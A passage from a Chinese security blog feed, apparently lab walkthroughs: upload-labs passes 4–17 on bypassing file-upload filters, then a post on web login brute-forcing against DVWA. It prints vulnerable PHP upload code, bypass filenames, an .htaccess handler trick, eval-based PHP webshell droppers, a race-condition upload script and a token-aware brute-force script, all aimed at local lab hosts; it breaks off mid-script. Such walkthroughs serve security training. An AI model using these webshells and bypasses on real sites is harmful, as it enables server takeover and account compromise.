.htaccess1234567891011121314151617181920212223242526272829&lt;?php$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(".php",".php5",".php4",".php3",".php2","php1",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2","pHp1",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf"); $file_name = trim($_FILES['upload_file']['name']); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //收尾去空 if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.$file_name; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else &#123; $msg = '此文件不允许上传!'; &#125; &#125; else &#123; $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; &#125;&#125;?&gt; 是黑名单，但几乎过滤了所有有问题的后缀名，除了.htaccess，于是首先上传一个.htaccess内容如下的文件: 1SetHandler application/x-httpd-php 然后随便上传一个后缀都会解析为php 第5关 大小写12345678910111213141516171819202122232425262728&lt;?php$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess"); $file_name = trim($_FILES['upload_file']['name']); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, '.'); $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.date("YmdHis").rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else &#123; $msg = '此文件类型不允许上传！'; &#125; &#125; else &#123; $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; &#125;&#125;?&gt; 大小写规则不全，可以使用phP后缀上传突破。 第6关 空格1234567891011121314151617181920212223242526272829&lt;?php$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess"); $file_name = $_FILES['upload_file']['name']; $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.date("YmdHis").rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file,$img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else &#123; $msg = '此文件不允许上传'; &#125; &#125; else &#123; $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; &#125;&#125;?&gt; 利用Windows系统不解析空格的文件名特性。文件名最后增加空格 第7关 点1234567891011121314151617181920212223242526272829&lt;?php$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess"); $file_name = trim($_FILES['upload_file']['name']); $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.$file_name; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else &#123; $msg = '此文件类型不允许上传！'; &#125; &#125; else &#123; $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; &#125;&#125;?&gt; 没有删除结尾的“.”，利用windows特性，会自动去掉后缀名中最后的”.”，可在后缀名中加”.”绕过 第8关 DATA12345678910111213141516171819202122232425262728&lt;?php$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess"); $file_name = trim($_FILES['upload_file']['name']); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.date("YmdHis").rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else &#123; $msg = '此文件类型不允许上传！'; &#125; &#125; else &#123; $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; &#125;&#125;?&gt; 还是黑名单，但是没有对后缀名进行去::$DATA处理，利用windows特性，可在后缀名中加::$DATA绕过：shell.php::$data 第9关 点+空格+点123456789101112131415161718192021222324252627282930&lt;?php$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess"); $file_name = trim($_FILES['upload_file']['name']); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.$file_name; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else &#123; $msg = '此文件类型不允许上传！'; &#125; &#125; else &#123; $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; &#125;&#125;?&gt; 黑名单过滤，注意下面这行和之前不太一样，路径拼接的是处理后的文件名: 1$img_path = UPLOAD_PATH.&apos;/&apos;.$file_name; 原理同Pass-06，上传文件名后加上点+空格+点 1shell.php. . 第10关 嵌套绕过123456789101112131415161718192021&lt;?php$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array("php","php5","php4","php3","php2","html","htm","phtml","pht","jsp","jspa","jspx","jsw","jsv","jspf","jtml","asp","aspx","asa","asax","ascx","ashx","asmx","cer","swf","htaccess"); $file_name = trim($_FILES['upload_file']['name']); $file_name = str_ireplace($deny_ext,"", $file_name); $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.$file_name; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else &#123; $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; &#125;&#125;?&gt; 只是删除而不是die： 1$file_name = str_ireplace($deny_ext,"", $file_name); 所以利用双写(嵌套)绕过 1shell.pphphp 第11关 GET型00截断1234567891011121314151617181920&lt;?php$is_upload = false;$msg = null;if(isset($_POST['submit']))&#123; $ext_arr = array('jpg','png','gif'); $file_ext = substr($_FILES['upload_file']['name'],strrpos($_FILES['upload_file']['name'],".")+1); if(in_array($file_ext,$ext_arr))&#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = $_GET['save_path']."/".rand(10, 99).date("YmdHis").".".$file_ext; if(move_uploaded_file($temp_file,$img_path))&#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else&#123; $msg = "只允许上传.jpg|.png|.gif类型文件！"; &#125;&#125;?&gt; 白名单判断，但是$img_path直接拼接: 1$img_path = $_GET['save_path']."/".rand(10, 99).date("YmdHis").".".$file_ext; 相当于上传了1.php%001.png 因此可以利用%00截断绕过： 需关闭magic_quotes_gpc php 版本&lt;5.3.4 第12关 POST型00截断1234567891011121314151617181920&lt;?php$is_upload = false;$msg = null;if(isset($_POST['submit']))&#123; $ext_arr = array('jpg','png','gif'); $file_ext = substr($_FILES['upload_file']['name'],strrpos($_FILES['upload_file']['name'],".")+1); if(in_array($file_ext,$ext_arr))&#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = $_POST['save_path']."/".rand(10, 99).date("YmdHis").".".$file_ext; if(move_uploaded_file($temp_file,$img_path))&#123; $is_upload = true; &#125; else &#123; $msg = "上传失败"; &#125; &#125; else &#123; $msg = "只允许上传.jpg|.png|.gif类型文件！"; &#125;&#125;?&gt; save_path是通过post传进来的: 1$img_path = $_POST['save_path']."/".rand(10, 99).date("YmdHis").".".$file_ext; 还是利用00截断，但这次需要在二进制中进行修改，因为post不会像get对%00进行自动解码。 第13关 图马123456789101112131415161718192021222324252627282930313233343536373839404142&lt;?phpfunction getReailFileType($filename)&#123; $file = fopen($filename, "rb"); $bin = fread($file, 2); //只读2字节 fclose($file); $strInfo = @unpack("C2chars", $bin); $typeCode = intval($strInfo['chars1'].$strInfo['chars2']); $fileType = ''; switch($typeCode)&#123; case 255216: $fileType = 'jpg'; break; case 13780: $fileType = 'png'; break; case 7173: $fileType = 'gif'; break; default: $fileType = 'unknown'; &#125; return $fileType;&#125;$is_upload = false;$msg = null;if(isset($_POST['submit']))&#123; $temp_file = $_FILES['upload_file']['tmp_name']; $file_type = getReailFileType($temp_file); if($file_type == 'unknown')&#123; $msg = "文件未知，上传失败！"; &#125;else&#123; $img_path = UPLOAD_PATH."/".rand(10, 99).date("YmdHis").".".$file_type; if(move_uploaded_file($temp_file,$img_path))&#123; $is_upload = true; &#125; else &#123; $msg = "上传出错！"; &#125; &#125;&#125;?&gt; getReailFileType函数只会读取文件的前两个字节: 12$file = fopen($filename, "rb");$bin = fread($file, 2); //只读2字节 所以我们伪造一个文件头即可，使用图马可以轻松绕过。利用的话，还需要结合文件包含漏洞。 第14关 getimagesize123456789101112131415161718192021222324252627282930313233&lt;?phpfunction isImage($filename)&#123; $types = '.jpeg|.png|.gif'; if(file_exists($filename))&#123; $info = getimagesize($filename); $ext = image_type_to_extension($info[2]); if(stripos($types,$ext)&gt;=0)&#123; return $ext; &#125;else&#123; return false; &#125; &#125;else&#123; return false; &#125;&#125;$is_upload = false;$msg = null;if(isset($_POST['submit']))&#123; $temp_file = $_FILES['upload_file']['tmp_name']; $res = isImage($temp_file); if(!$res)&#123; $msg = "文件未知，上传失败！"; &#125;else&#123; $img_path = UPLOAD_PATH."/".rand(10, 99).date("YmdHis").$res; if(move_uploaded_file($temp_file,$img_path))&#123; $is_upload = true; &#125; else &#123; $msg = "上传出错！"; &#125; &#125;&#125;?&gt; 校验了文件头： 1$info = getimagesize($filename); 利用图片马就可进行绕过 第15关 exif_imagetype12345678910111213141516171819202122232425262728293031323334353637&lt;?phpfunction isImage($filename)&#123; //需要开启php_exif模块 $image_type = exif_imagetype($filename); switch ($image_type) &#123; case IMAGETYPE_GIF: return "gif"; break; case IMAGETYPE_JPEG: return "jpg"; break; case IMAGETYPE_PNG: return "png"; break; default: return false; break; &#125;&#125;$is_upload = false;$msg = null;if(isset($_POST['submit']))&#123; $temp_file = $_FILES['upload_file']['tmp_name']; $res = isImage($temp_file); if(!$res)&#123; $msg = "文件未知，上传失败！"; &#125;else&#123; $img_path = UPLOAD_PATH."/".rand(10, 99).date("YmdHis").".".$res; if(move_uploaded_file($temp_file,$img_path))&#123; $is_upload = true; &#125; else &#123; $msg = "上传出错！"; &#125; &#125;&#125;?&gt; php_exif模块来判断文件类型，还是直接就可以利用图片马就可进行绕过： 1$image_type = exif_imagetype($filename); 第16关 二次渲染绕过1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586&lt;?php$is_upload = false;$msg = null;if (isset($_POST['submit']))&#123; // 获得上传文件的基本信息，文件名，类型，大小，临时文件路径 $filename = $_FILES['upload_file']['name']; $filetype = $_FILES['upload_file']['type']; $tmpname = $_FILES['upload_file']['tmp_name']; $target_path=UPLOAD_PATH.'/'.basename($filename); // 获得上传文件的扩展名 $fileext= substr(strrchr($filename,"."),1); //判断文件后缀与类型，合法才进行上传操作 if(($fileext == "jpg") &amp;&amp; ($filetype=="image/jpeg"))&#123; if(move_uploaded_file($tmpname,$target_path))&#123; //使用上传的图片生成新的图片 $im = imagecreatefromjpeg($target_path); if($im == false)&#123; $msg = "该文件不是jpg格式的图片！"; @unlink($target_path); &#125;else&#123; //给新图片指定文件名 srand(time()); $newfilename = strval(rand()).".jpg"; //显示二次渲染后的图片（使用用户上传图片生成的新图片） $img_path = UPLOAD_PATH.'/'.$newfilename; imagejpeg($im,$img_path); @unlink($target_path); $is_upload = true; &#125; &#125; else &#123; $msg = "上传出错！"; &#125; &#125;else if(($fileext == "png") &amp;&amp; ($filetype=="image/png"))&#123; if(move_uploaded_file($tmpname,$target_path))&#123; //使用上传的图片生成新的图片 $im = imagecreatefrompng($target_path); if($im == false)&#123; $msg = "该文件不是png格式的图片！"; @unlink($target_path); &#125;else&#123; //给新图片指定文件名 srand(time()); $newfilename = strval(rand()).".png"; //显示二次渲染后的图片（使用用户上传图片生成的新图片） $img_path = UPLOAD_PATH.'/'.$newfilename; imagepng($im,$img_path); @unlink($target_path); $is_upload = true; &#125; &#125; else &#123; $msg = "上传出错！"; &#125; &#125;else if(($fileext == "gif") &amp;&amp; ($filetype=="image/gif"))&#123; if(move_uploaded_file($tmpname,$target_path))&#123; //使用上传的图片生成新的图片 $im = imagecreatefromgif($target_path); if($im == false)&#123; $msg = "该文件不是gif格式的图片！"; @unlink($target_path); &#125;else&#123; //给新图片指定文件名 srand(time()); $newfilename = strval(rand()).".gif"; //显示二次渲染后的图片（使用用户上传图片生成的新图片） $img_path = UPLOAD_PATH.'/'.$newfilename; imagegif($im,$img_path); @unlink($target_path); $is_upload = true; &#125; &#125; else &#123; $msg = "上传出错！"; &#125; &#125;else&#123; $msg = "只允许上传后缀为.jpg|.png|.gif的图片文件！"; &#125;&#125;?&gt; 本关综合判断了后缀名、content-type，以及利用imagecreatefromgif判断是否为gif图片，最后再做了一次二次渲染。 所以要把木马放到两次渲染后活下来的数据块里。这里有国外大牛写的脚本，直接拿来运行即可。 123456789101112131415161718192021222324&lt;?php$p = array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23, 0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae, 0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc, 0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f, 0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c, 0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d, 0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1, 0x66, 0x44, 0x50, 0x33);$img = imagecreatetruecolor(32, 32);for ($y = 0; $y &lt; sizeof($p); $y += 3) &#123; $r = $p[$y]; $g = $p[$y+1]; $b = $p[$y+2]; $color = imagecolorallocate($img, $r, $g, $b); imagesetpixel($img, round($y / 3), 0, $color);&#125;imagepng($img,'./1.png');?&gt; 详细步骤转载：https://yang1k.github.io/post/upload-pass16/ upload-labs之pass 16详细分析https://xz.aliyun.com/t/2657 第17关 条件竞争12345678910111213141516171819202122232425&lt;?php$is_upload = false;$msg = null;if(isset($_POST['submit']))&#123; $ext_arr = array('jpg','png','gif'); $file_name = $_FILES['upload_file']['name']; $temp_file = $_FILES['upload_file']['tmp_name']; $file_ext = substr($file_name,strrpos($file_name,".")+1); $upload_file = UPLOAD_PATH . '/' . $file_name; if(move_uploaded_file($temp_file, $upload_file))&#123; if(in_array($file_ext,$ext_arr))&#123; $img_path = UPLOAD_PATH . '/'. rand(10, 99).date("YmdHis").".".$file_ext; rename($upload_file, $img_path); $is_upload = true; &#125;else&#123; $msg = "只允许上传.jpg|.png|.gif类型文件！"; unlink($upload_file); &#125; &#125;else&#123; $msg = '上传出错！'; &#125;&#125;?&gt; 观察代码先传再验证是否符合要求，所以利用条件竞争删除文件时间差绕过。这里先将文件上传到服务器，然后通过rename修改名称： 123$upload_file = UPLOAD_PATH . '/' . $file_name;$img_path = UPLOAD_PATH . '/'. rand(10, 99).date("YmdHis").".".$file_ext;rename($upload_file, $img_path); 再通过unlink删除文件: 1unlink($upload_file); 因此可以通过条件竞争的方式在unlink之前，访问webshell。 1&lt;?php fputs(fopen('gg.php','w'),'&lt;?php eval($_POST[1])?&gt;');?&gt; 该木马可以在被杀掉的瞬间创建一个gg.php子木马 BurpSuite 空字节爆破：原理：第一个payload执行shell.php 第二个payload不断访问www/upload/shell.php直到生成gg.php 选择没有载荷 使用Python脚本实现多线程下一直访问shell.php，直到生成gg.php 123456789101112131415161718#coding=utf-8import requestsfrom multiprocessing import Pooldef CompeteUpload(list): url="http://192.168.242.128/upload-labs/Pass-17/index.php" geturl="http://192.168.242.128/upload-labs/upload/info.php" file=&#123;'upload_file':('info.php',"&lt;?php fputs(fopen('shell.php','w'),'&lt;?php @eval($_POST[ironman]);?&gt;');?&gt;",'image/jpeg')&#125; data=&#123;'submit':'上传'&#125; r=requests.post(url=url,data=data,files=file) #print "test upload...." r1=requests.get(url=geturl) if r1.status_code==200: print "upload success!"if __name__=="__main__": pool = Pool(10) pool.map(CompeteUpload, range(10000)) pool.close() pool.join()]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>Web</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[身份认证技术]]></title>
    <url>%2F%2F2020%2F08%2Fe9e5edd8.html</url>
    <content type="text"><![CDATA[认证技术身份认证技术是用于在计算机网络中确认操作者身份的一种有效的解决方法。 计算机网络世界中一切信息包括用户的身份信息都是用一组特定的数据来表示的，计算机只能识别用户的数字身份，所有对用户的授权也是针对用户数字身份的授权。身份认证攻击就是为了使用各种办法通过这层认证，突破作为防护网络资产的第一道关口，身份认证攻击在渗透测试中有着举足轻重的作用。 对于身份认证攻击可以直接进行爆破攻击，在配置不当的情况下内网中还会经常遇到非授权访问。 Web认证爆破DWVA 靶场搭建官方网站:http://www.dvwa.co.uk/ 项目地址:https://github.com/ethicalhack3r/DVWA DVWA 是一个入门的 Web 安全学习靶场。这里直接去 Dokcer Hub 搜索一个容器来部署安装： 12345# 拉取镜像docker pull sqreen/dvwa# 部署安装docker run -d -t -p 8888:80 sqreen/dvwa 然后本地浏览器访问 http://127.0.0.1:8888，我们首先需要初始化一下 DVWA，相关的版本信息如下: 1234567891011121314151617181920212223# MySQL root 用户密码为空$ mysql -e &quot;select version(),user()&quot;+---------------------------+----------------+| version() | user() |+---------------------------+----------------+| 10.3.22-MariaDB-0+deb10u1 | root@localhost |+---------------------------+----------------+# PHP 7.3.14 版本$ php -vPHP 7.3.14-1~deb10u1 (cli) (built: Feb 16 2020 15:07:23) ( NTS )Copyright (c) 1997-2018 The PHP GroupZend Engine v3.3.14, Copyright (c) 1998-2018 Zend Technologies with Zend OPcache v7.3.14-1~deb10u1, Copyright (c) 1999-2018, by Zend Technologies# Apache 版本为 2.4.38$ apache2 -vServer version: Apache/2.4.38 (Debian)Server built: 2019-10-15T19:53:42# 内核版本$ uname -aLinux 57bb72d1c052 4.19.76-linuxkit #1 SMP Fri Apr 3 15:53:26 UTC 2020 x86_64 GNU/Linux 在 Web 安全领域暴力破解是一个基础技能，不仅需要好的字典，还需要具有灵活编写脚本的能力。 DVWA 基础爆破 Low GET 登录不够安全，一般使用 POST 方式进行登录 用户名和密码都没有进行过滤 Medium 这个 Medium 级别的源码登录逻辑并没有啥变化，只是登录失败的时候会延时 2 秒，这样爆破的速度会慢一些，不过依然可以进行传统的暴力破解。 CTFHub Basic 基础认证爆破官网：https://www.ctfhub.com/ 「CTFHub技能树」—「Web前置技能」—「HTTP协议」—「基础认证」： 四位纯数字爆破简单编写一个代码用来练习数字爆破： 123456789&lt;?phperror_reporting(0);if(isset($_REQUEST['pass']))&#123; echo 'flag&#123;xxxxxxx&#125;';&#125;else&#123; echo 'pass is error &lt;br&gt;'; echo "hint: isset(\$_REQUEST['pass'])";&#125;?&gt; 四种常见的 POST 提交数据方式顺便提一下 四种常见的 POST 提交数据方式： application/x-www-form-urlencoded最常见的 POST 提交数据的方式了。浏览器的原生&lt;form&gt;表单，请求类似于下面这样： 1234POST http://www.example.com HTTP/1.1Content-Type: application/x-www-form-urlencoded;charset=utf-8title=test&amp;sub%5B%5D=1&amp;sub%5B%5D=2&amp;sub%5B%5D=3 multipart/form-data另一个常见的 POST 数据提交的方式,这种方式一般用来上传文件，各大服务端语言对它也有着良好的支持。一个请求示例： 12345678910111213POST http://www.example.com HTTP/1.1Content-Type:multipart/form-data; boundary=----WebKitFormBoundaryrGKCBY7qhFd3TrwA------WebKitFormBoundaryrGKCBY7qhFd3TrwAContent-Disposition: form-data; name=&quot;text&quot;title------WebKitFormBoundaryrGKCBY7qhFd3TrwAContent-Disposition: form-data; name=&quot;file&quot;; filename=&quot;chrome.png&quot;Content-Type: image/pngPNG ... content of chrome.png ...------WebKitFormBoundaryrGKCBY7qhFd3TrwA-- 首先生成了一个 boundary 用于分割不同的字段，为了避免与正文内容重复，boundary 很长很复杂。 然后 Content-Type 里指明了数据是以 multipart/form-data 来编码，本次请求的 boundary 是什么内容。 消息主体里按照字段个数又分为多个结构类似的部分，每部分都是以 –boundary 开始，紧接着是内容描述信息，然后是回车，最后是字段具体内容（文本或二进制）。 如果传输的是文件，还要包含文件名和文件类型信息。消息主体最后以 –boundary– 标示结束。 表单演示： 1234567891011&lt;html&gt;&lt;head&gt; &lt;title&gt;multipart/form-data 测试&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;form action="http://127.0.0.1/php/brute.php" method="post" enctype="multipart/form-data"&gt; &lt;input type="text" name="pass"&gt; &lt;input type="submit"&gt; &lt;/form&gt;&lt;/body&gt;&lt;/html&gt; application/json在越来越多的人把它作为请求头，用来告诉服务端消息主体是序列化后的 JSON 字符串。 由于 JSON 规范的流行，除了低版本 IE 之外的各大浏览器都原生支持，服务端语言也都有处理 JSON 的函数，使用 JSON 不会遇上什么麻烦: 1234POST http://www.example.com HTTP/1.1Content-Type: application/json;charset=utf-8&#123;&quot;title&quot;:&quot;test&quot;,&quot;sub&quot;:[1,2,3]&#125; text/xml一种使用 HTTP 作为传输协议，XML 作为编码方式的远程调用规范。典型的 XML-RPC 请求是这样的： 123456789101112POST http://www.example.com HTTP/1.1Content-Type: text/xml&lt;?xml version=&quot;1.0&quot;?&gt;&lt;methodCall&gt; &lt;methodName&gt;examples.getStateName&lt;/methodName&gt; &lt;params&gt; &lt;param&gt; &lt;value&gt;&lt;i4&gt;41&lt;/i4&gt;&lt;/value&gt; &lt;/param&gt; &lt;/params&gt;&lt;/methodCall&gt; 早期安全狗也曾出现过 WAF 缺陷，因为匹配过于严谨，一个空格导致安全狗被绕过： 1234# 原内容：Content-Type: multipart/form-data; boundary=---------------------------471463142114# 修改后 boundary后面加入空格。Content-Type: multipart/form-data; boundary =---------------------------471463142114 带验证码爆破实验环境：http://lab1.xseclab.com/vcode7_f7947d56f22133dbc85dda4f28530268/index.php 工具：Pkav HTTP Fuzzer Python 生成一个 3 位数的字典： 12345with open('dic.txt', 'w') as f: for x in range(10): for y in range(10): for z in range(10): f.write(f'&#123;x&#125;&#123;y&#125;&#123;z&#125;\n') 使用 Pkav 的 HTTP Fuzz 测试工具进行爆破即可。 DVWA - High 带 Token 爆破源码： 1234567891011121314151617181920212223// 检测用户的 tokencheckToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );// 过滤用户名和密码$user = $checkToken_GET[ 'username' ];$user = stripslashes( $user );$user = mysql_real_escape_string( $user );$pass = $_GET[ 'password' ];$pass = stripslashes( $pass );$pass = mysql_real_escape_string( $pass );$pass = md5( $pass );// 数据匹配$query = "SELECT * FROM `users` WHERE user = '$user' AND password = '$pass';";$result = mysql_query( $query ) or die( '&lt;pre&gt;' . mysql_error() . '&lt;/pre&gt;' );if( $result &amp;&amp; mysql_num_rows( $result ) == 1 ) &#123; 登录成功&#125;else &#123; sleep( rand( 0, 3 ) ); 登录失败&#125; 这一关增加了 token 的检测，从如下代码: 1checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' ); Token 的值来源于 index.php，访问 index.php 查看源码信息，找到如下 token 的位置: 1require_once DVWA_WEB_PAGE_TO_ROOT . 'dvwa/includes/dvwaPage.inc.php'; 追踪 dvwaPage.inc.php 找到 token 相关函数的定义： 123456789101112131415161718192021function checkToken( $user_token, $session_token, $returnURL ) &#123; # 校验 token if( $user_token !== $session_token || !isset( $session_token ) ) &#123; dvwaMessagePush( 'CSRF token is incorrect' ); dvwaRedirect( $returnURL ); &#125;&#125;function generateSessionToken() &#123; # 当前时间的 md5 值作为 token if( isset( $_SESSION[ 'session_token' ] ) ) &#123; destroySessionToken(); &#125; $_SESSION[ 'session_token' ] = md5( uniqid() );&#125;function destroySessionToken() &#123; # 销毁 token unset( $_SESSION[ 'session_token' ] );&#125;function tokenField() &#123; # 将 token 输出到 input 框中 return "&lt;input type='hidden' name='user_token' value='&#123;$_SESSION[ 'session_token' ]&#125;' /&gt;";&#125; 然后登陆的数据包如下: 1GET /vulnerabilities/brute/index.php?username=admin&amp;password=password&amp;Login=Login&amp;user_token=&#123;token&#125; HTTP/1.1 需要在 user_token 的后面跟上之前从源码中获取到的 token 值，这是一个登陆的完整流程，下面使用 Python 脚本进行爆破。 1234567891011121314151617181920212223242526272829303132333435363738394041424344import osimport reimport sysimport requestsdef get_token(headers): index_url = 'http://127.0.0.1:8888/vulnerabilities/brute/index.php' index_html = requests.get(url=index_url, headers=headers, timeout=3).text token_pattern = re.compile(r"name='user_token' value='(.*?)'") token = token_pattern.findall(index_html)[0] return tokendef brute_with_token(uname, passwd, headers): token = get_token(headers) brute_url = f'http://127.0.0.1:8888/vulnerabilities/brute/index.php?username=&#123;uname&#125;&amp;password=&#123;passwd&#125;&amp;Login=Login&amp;user_token=&#123;token&#125;' r = requests.get(url=brute_url, headers=headers) print(f'&#123;token&#125;:&#123;uname&#125;:&#123;passwd&#125;', end='\n') if 'hackable' in r.text: print('\nBingo 爆破成功') print(f'username:&#123;uname&#125; \npassword:&#123;passwd&#125;\n') os._exit(0)if __name__ == '__main__': headers = &#123; 'Host': '127.0.0.1:8888', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:56.0) Gecko/20100101 Firefox/56.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'Accept-Language': 'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3', 'Accept-Encoding': 'gzip, deflate', 'Cookie': 